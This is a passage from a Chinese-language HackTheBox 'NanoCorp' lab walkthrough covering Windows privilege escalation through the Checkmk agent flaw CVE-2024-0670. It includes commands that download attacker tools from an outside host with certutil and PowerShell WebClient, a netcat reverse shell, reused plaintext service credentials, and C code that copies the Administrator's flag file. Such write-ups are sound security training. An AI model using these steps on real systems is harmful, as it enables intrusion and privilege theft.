writable\n\ndistinguishedName: CN=S-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e,CN=ForeignSecurityPrincipals,DC=nanocorp,DC=htb\npermission: WRITE\n\ndistinguishedName: CN=monitoring_svc,OU=AD_Monitoring,DC=nanocorp,DC=htb\npermission: WRITE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传 \u003ccode\u003ewinpeas64\u003c/code\u003e ，\u003ccode\u003ecertutil\u003c/code\u003e 被杀毒拦了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ePS C:\\tools\u003e certutil -urlcache -split -f http://\u0026#x3C;your-ip\u003e/winpeas64.exe\nAt line:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e char:\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n+ certutil -urlcache -split -f http://\u0026#x3C;your-ip\u003e/winpeas64.exe\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e has been blocked by your antivirus software.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是可以通过 \u003ccode\u003ewebclient\u003c/code\u003e 来上传\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$p=new-\u003cspan class=\"hljs-built_in\"\u003eobject\u003c/span\u003e system.net.webclient;$p.downloadfile(\u003cspan class=\"hljs-string\"\u003e'http://\u0026#x3C;your-ip\u003e/winpeas64.exe'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'C:\\tools\\winpeas64.exe'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能找到一些有趣的信息，一个前面没有扫描出来的端口 6556\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e重新扫描一下 6556 端口，该端口状态为 \u003ccode\u003efiltered\u003c/code\u003e ，服务是 \u003ccode\u003echeckmk-agent\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  NanoCorp nmap -p6556 nanocorp.htb -vv                        \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.95\u003c/span\u003e ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e 02:07 CST\nInitiating Ping Scan at 02:07\nScanning nanocorp.htb (\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e) [\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e ports]\nCompleted Ping Scan at 02:07, \u003cspan class=\"hljs-number\"\u003e0.06\u003c/span\u003es elapsed (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e total hosts)\nInitiating SYN Stealth Scan at 02:07\nScanning nanocorp.htb (\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e) [\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e port]\nCompleted SYN Stealth Scan at 02:07, \u003cspan class=\"hljs-number\"\u003e0.44\u003c/span\u003es elapsed (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e total ports)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e nanocorp.htb (\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e)\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up, received echo-reply ttl \u003cspan class=\"hljs-number\"\u003e127\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.041\u003c/span\u003es latency).\nScanned at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e 02:07:04 CST \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 1s\n\nPORT     STATE    SERVICE       REASON\n\u003cspan class=\"hljs-number\"\u003e6556\u003c/span\u003e/tcp filtered checkmk-agent no-response\n\nRead data files \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e: /usr/share/nmap\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0.66\u003c/span\u003e seconds\n           Raw packets sent: \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e (240B) | Rcvd: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e (28B)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试寻找一下 \u003ccode\u003echeckmk\u003c/code\u003e 的漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/\"\u003ehttps://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e改文章表示可以通过 checkmk 来进行本地权限执行，并且示范系统是 Window，漏洞编号是 \u003ccode\u003eCVE-2024-0670\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e通过分析，大概就是：在某些情况下，该软件会在 \u003ccode\u003eC:\\Windows\\Temp\u003c/code\u003e 目录下创建临时文件，这些文件随后会被执行。攻击者可以利用这一点，预先将受写保护的恶意文件放置到该目录中。这些文件会由 Checkmk 以 SYSTEM 权限执行，从而使攻击者能够提升其权限。\u003c/p\u003e\n\u003cp\u003e查看程序版本：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ePS C:\\\u003e (Get-Item \u003cspan class=\"hljs-string\"\u003e\"C:\\Program Files (x86)\\checkmk\\service\\check_mk_agent.exe\"\u003c/span\u003e).VersionInfo\n\nProductVersion   FileVersion      FileName                                                                              \n--------------   -----------      --------                                                                              \n\u003cspan class=\"hljs-number\"\u003e2.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003ep10         \u003cspan class=\"hljs-number\"\u003e2.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e          C:\\Program Files (x86)\\checkmk\\service\\check_mk_agent.exe  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e并没有在修复版本中，是存在漏洞的\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e用户 \u003ccode\u003emonitoring_svc\u003c/code\u003e 没有查看 Temp 文件夹的权限，尝试切换到 \u003ccode\u003eWEB_SVC\u003c/code\u003e 的 shell\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eWEB_SVC\u003c/code\u003e 是可以进行访问的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ePS C:\\tools\u003e ./RunasCs.exe WEB_SVC \u003cspan class=\"hljs-string\"\u003e'dksehdgh712!@#'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'whoami'\u003c/span\u003e\n\nnanocorp\\web_svc\n\nPS C:\\tools\u003e ./RunasCs.exe WEB_SVC \u003cspan class=\"hljs-string\"\u003e'dksehdgh712!@#'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'powershell.exe /c \"ls C:\\Windows\\Temp -Filter\"'\u003c/span\u003e\n.......\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e本来想通过 \u003ccode\u003eMSF\u003c/code\u003e 弹 \u003ccode\u003eWEB_SVC\u003c/code\u003e 到 Kali 上，但是被杀毒干掉了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里上传 \u003ccode\u003enc\u003c/code\u003e 来弹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e因为杀毒，所以就不创建弹 shell 的程序了，直接读 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e脚本由 AI 生成\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e\u003cspan class=\"hljs-meta\"\u003e#\u003cspan class=\"hljs-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x3C;stdio.h\u003e\u003c/span\u003e    \u003cspan class=\"hljs-comment\"\u003e// For file operations (fopen, fread, fwrite, fclose, rename)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-meta\"\u003e#\u003cspan class=\"hljs-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x3C;stdlib.h\u003e\u003c/span\u003e   \u003cspan class=\"hljs-comment\"\u003e// For exit()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-meta\"\u003e#\u003cspan class=\"hljs-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x3C;windows.h\u003e\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e// For Windows-specific error handling (GetLastError, FormatMessageA)\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e// Buffer size, defined as 4KB. This is a common and efficient size for file I/O.\u003c/span\u003e\n\u003cspan class=\"hljs-meta\"\u003e#\u003cspan class=\"hljs-keyword\"\u003edefine\u003c/span\u003e BUFFER_SIZE 4096 \u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e// Error handling function remains unchanged, as it is very useful.\u003c/span\u003e\n\u003cspan class=\"hljs-type\"\u003evoid\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003eprint_error_message\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-type\"\u003econst\u003c/span\u003e \u003cspan class=\"hljs-type\"\u003echar\u003c/span\u003e* prefix)\u003c/span\u003e {\n    DWORD errorCode = GetLastError();\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (errorCode == \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n        \u003cspan class=\"hljs-comment\"\u003e// If there's no system error code, just print the custom message.\u003c/span\u003e\n        \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"%s\\n\"\u003c/span\u003e, prefix);\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e;\n    }\n\n    LPSTR messageBuffer = \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e;\n    FormatMessageA(\n        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\n        \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e, \n        errorCode, \n        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\n        (LPSTR)\u0026#x26;messageBuffer, \n        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \n        \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e\n    );\n\n    \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"%s: %s\"\u003c/span\u003e, prefix, messageBuffer);\n    LocalFree(messageBuffer);\n}\n\n\u003cspan class=\"hljs-type\"\u003eint\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003emain\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e {\n    \u003cspan class=\"hljs-comment\"\u003e// Define source and destination file paths\u003c/span\u003e\n    \u003cspan class=\"hljs-type\"\u003econst\u003c/span\u003e \u003cspan class=\"hljs-type\"\u003echar\u003c/span\u003e *sourcePath = \u003cspan class=\"hljs-string\"\u003e\"C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-type\"\u003econst\u003c/span\u003e \u003cspan class=\"hljs-type\"\u003echar\u003c/span\u003e *destPath = \u003cspan class=\"hljs-string\"\u003e\"C:\\\\tools\\\\sunset.txt\"\u003c/span\u003e;\n    \u003cspan class=\"hljs-type\"\u003econst\u003c/span\u003e \u003cspan class=\"hljs-type\"\u003echar\u003c/span\u003e *backupPath = \u003cspan class=\"hljs-string\"\u003e\"C:\\\\tools\\\\sunset.txt.bak\"\u003c/span\u003e;\n\n    FILE *sourceFile = \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e;\n    FILE *destFile = \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e;\n    FILE *checkFile = \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-comment\"\u003e// --- NEW: Backup Logic ---\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// First, check if the destination file already exists.\u003c/span\u003e\n    checkFile = fopen(destPath, \u003cspan class=\"hljs-string\"\u003e\"rb\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (checkFile != \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e) {\n        \u003cspan class=\"hljs-comment\"\u003e// The file exists, so we must close it before trying to rename.\u003c/span\u003e\n        fclose(checkFile);\n\n        \u003cspan class=\"hljs-comment\"\u003e// Rename the existing destination file to create a backup.\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (rename(destPath, backupPath) != \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n            print_error_message(\u003cspan class=\"hljs-string\"\u003e\"Failed to create backup file\"\u003c/span\u003e);\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e; \u003cspan class=\"hljs-comment\"\u003e// Exit with an error\u003c/span\u003e\n        }\n        \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Backup created at: %s\\n\"\u003c/span\u003e, backupPath);\n    }\n    \u003cspan class=\"hljs-comment\"\u003e// If checkFile is NULL, it means the destination file doesn't exist, so we can just proceed.\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e// 1. Open the source file (in binary read mode \"rb\")\u003c/span\u003e\n    sourceFile = fopen(sourcePath, \u003cspan class=\"hljs-string\"\u003e\"rb\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (sourceFile == \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e) {\n        print_error_message(\u003cspan class=\"hljs-string\"\u003e\"Failed to open source file\"\u003c/span\u003e);\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e; \u003cspan class=\"hljs-comment\"\u003e// Abnormal program exit\u003c/span\u003e\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// 2. Create and open the destination file (in binary write mode \"wb\")\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// \"wb\" mode will overwrite the file if it exists.\u003c/span\u003e\n    destFile = fopen(destPath, \u003cspan class=\"hljs-string\"\u003e\"wb\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (destFile == \u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e) {\n        print_error_message(\u003cspan class=\"hljs-string\"\u003e\"Failed to create destination file\"\u003c/span\u003e);\n        fclose(sourceFile); \u003cspan class=\"hljs-comment\"\u003e// Ensure the successfully opened source file is closed before exiting\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// 3. Loop to read and write, performing the file copy\u003c/span\u003e\n    \u003cspan class=\"hljs-type\"\u003echar\u003c/span\u003e buffer[BUFFER_SIZE];\n    \u003cspan class=\"hljs-type\"\u003esize_t\u003c/span\u003e bytesRead;\n\n    \u003cspan class=\"hljs-comment\"\u003e// fread reads data from sourceFile into the buffer.\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// The loop continues as long as the number of bytes read (bytesRead) is greater than 0.\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ((bytesRead = fread(buffer, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, BUFFER_SIZE, sourceFile)) \u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n        \u003cspan class=\"hljs-comment\"\u003e// fwrite writes data from the buffer to destFile.\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e// Check if the number of bytes written equals the number of bytes read.\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (fwrite(buffer, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, bytesRead, destFile) != bytesRead) {\n            \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"An error occurred while writing to the destination file.\\n\"\u003c/span\u003e);\n            fclose(sourceFile);\n            fclose(destFile);\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n        }\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// Check if the loop ended because of a reading error\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (ferror(sourceFile)) {\n        \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"An error occurred while reading from the source file.\\n\"\u003c/span\u003e);\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-comment\"\u003e// If there were no errors, the copy was successful\u003c/span\u003e\n        \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"File successfully copied to: %s\\n\"\u003c/span\u003e, destPath);\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// 4. Cleanup: Close both files\u003c/span\u003e\n    fclose(sourceFile);\n    fclose(destFile);\n\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; \u003cspan class=\"hljs-comment\"\u003e// Normal program exit\u003c/span\u003e\n}\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e生成恶意程序\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e➜  x86_64-w64-mingw32-gcc root.c -o root.exe -lkernel32\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e因为需要强制 \u003ccode\u003eCheckmk\u003c/code\u003e 写入并执行这些临时文件\u003c/p\u003e\n\u003cp\u003e经观察，修复软件即可解决问题。可通过 Windows 图形用户界面或使用以下命令启动修复过程。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ePS C:\\tools\u003e ls C:\\Windows\\Installer\\\n\n    Directory: C:\\Windows\\Installer\n\nMode                 LastWriteTime         Length Name                                                                  \n----                 -------------         ------ ----                                                                  \nd-----          \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e PM                {\u003cspan class=\"hljs-number\"\u003e6070B\u003c/span\u003eE95-B84D\u003cspan class=\"hljs-number\"\u003e-40F\u003c/span\u003eE\u003cspan class=\"hljs-number\"\u003e-8\u003c/span\u003eABD-C70B59F5A164}                                \nd-----          \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e PM                {\u003cspan class=\"hljs-number\"\u003e675\u003c/span\u003eA6D5C-FF5A\u003cspan class=\"hljs-number\"\u003e-11\u003c/span\u003eEF-AEA3\u003cspan class=\"hljs-number\"\u003e-1967\u003c/span\u003eAD678D6D}                                \n-a----         \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e PM       \u003cspan class=\"hljs-number\"\u003e12637696\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1e6\u003c/span\u003ef2.msi                                                             \n-a----         \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e AM         \u003cspan class=\"hljs-number\"\u003e184320\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e387\u003c/span\u003ec2.msi                                                             \n-a----         \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e AM         \u003cspan class=\"hljs-number\"\u003e184320\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e387\u003c/span\u003ec6.msi                                                             \n-a----         \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e AM         \u003cspan class=\"hljs-number\"\u003e192512\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e387\u003c/span\u003eca.msi                                                             \n-a----         \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2023\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e AM         \u003cspan class=\"hljs-number\"\u003e192512\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e387\u003c/span\u003ece.msi                                                             \n-a----          \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e PM       \u003cspan class=\"hljs-number\"\u003e60895232\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e387\u003c/span\u003ed1.msi                                                             \n-a----          \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e PM          \u003cspan class=\"hljs-number\"\u003e20480\u003c/span\u003e SourceHash{\u003cspan class=\"hljs-number\"\u003e0025\u003c/span\u003eDD72-A959\u003cspan class=\"hljs-number\"\u003e-45B\u003c/span\u003e5-A0A3\u003cspan class=\"hljs-number\"\u003e-7\u003c/span\u003eEFEB15A8050}                      \n-a----          \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e PM          \u003cspan class=\"hljs-number\"\u003e20480\u003c/span\u003e SourceHash{\u003cspan class=\"hljs-number\"\u003e6070B\u003c/span\u003eE95-B84D\u003cspan class=\"hljs-number\"\u003e-40F\u003c/span\u003eE\u003cspan class=\"hljs-number\"\u003e-8\u003c/span\u003eABD-C70B59F5A164}                      \n-a----          \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e PM          \u003cspan class=\"hljs-number\"\u003e20480\u003c/span\u003e SourceHash{\u003cspan class=\"hljs-number\"\u003e675\u003c/span\u003eA6D5C-FF5A\u003cspan class=\"hljs-number\"\u003e-11\u003c/span\u003eEF-AEA3\u003cspan class=\"hljs-number\"\u003e-1967\u003c/span\u003eAD678D6D}                      \n-a----          \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e PM          \u003cspan class=\"hljs-number\"\u003e20480\u003c/span\u003e SourceHash{\u003cspan class=\"hljs-number\"\u003e73F\u003c/span\u003e77E4E\u003cspan class=\"hljs-number\"\u003e-5\u003c/span\u003eA17\u003cspan class=\"hljs-number\"\u003e-46E5\u003c/span\u003e-A5FC\u003cspan class=\"hljs-number\"\u003e-8\u003c/span\u003eA061047725F}                      \n-a----          \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e PM          \u003cspan class=\"hljs-number\"\u003e20480\u003c/span\u003e SourceHash{C2C59CAB\u003cspan class=\"hljs-number\"\u003e-8766\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-4\u003c/span\u003eABD-A8EF\u003cspan class=\"hljs-number\"\u003e-1151\u003c/span\u003eA36C41E5}                      \n-a----          \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e PM          \u003cspan class=\"hljs-number\"\u003e20480\u003c/span\u003e SourceHash{D5D19E2F\u003cspan class=\"hljs-number\"\u003e-7189\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-42F\u003c/span\u003eE\u003cspan class=\"hljs-number\"\u003e-8103\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-92\u003c/span\u003eCD1FA457C2}  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e经过测试 \u003ccode\u003e1e6f2.msi\u003c/code\u003e 是该文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ePS C:\\\u003e get-process | findstr check\nget-process | findstr check\n    \u003cspan class=\"hljs-number\"\u003e234\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e3032\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e12792\u003c/span\u003e              \u003cspan class=\"hljs-number\"\u003e5868\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e check_mk_agent\n    \nPS 